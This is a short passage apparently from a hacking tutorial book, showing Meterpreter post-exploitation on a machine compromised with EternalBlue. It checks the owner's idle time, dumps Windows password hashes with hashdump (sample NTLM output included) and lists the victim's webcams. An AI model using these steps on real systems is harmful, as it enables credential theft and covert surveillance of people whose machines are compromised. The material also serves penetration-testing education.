```
meterpreter > idletime As you can see, this system has
been idle for just 48 minutes and 56 seconds. The system’s
owner is likely nearby. Better to be cautious than dead!
```

If we have system administrator privileges on the target—as
we do with the EternalBlue exploit—we can get all the
hashes of all the passwords by simply using the hashdump
command.

```
meterpreter > hashdump 202 | P a g e
```

```
meterpreter > hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaae8fb117ad06bdd830b75
86c:::
ASPNET:1007:b5a564bc22934f4cb2a6edbb0b98952d6:0f3903151a9afc1afdec9d87a583a48c:::
Guest:501:aad3b435b51404eeaaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
hacker:1010:2ad6d62a57cbe4ddaad3b435b51404ee:a5dc24b1999182b03438ffdaed8d5312:::
IUSR_2K3TARGET:1003:7e24a98ab6dd72ec8ae00eb86c8bb2b8:1900f037b4072bbce07b9e3bb7b
4f8ea:::
IWAM_2K3TARGET:1004:071d6126daf6116deb7c5ba280de2f26:1071c94e0321e6deed014d9a5df
cf021:::
SQLDebugger:1009:aad3b435b51404eeaaad3b435b51404ee:73773ed7bd7af499c968a9552eb454
0b:::
SUPPORT_388945a0:1001:aad3b435b51404eeaaad3b435b51404ee:0d1cca0a07f89506e188199d4
cdf2151:::
meterpreter >
```

```
meterpreter > webcam_list
1: VirtualBox Webcam - HP TrueVision HD
```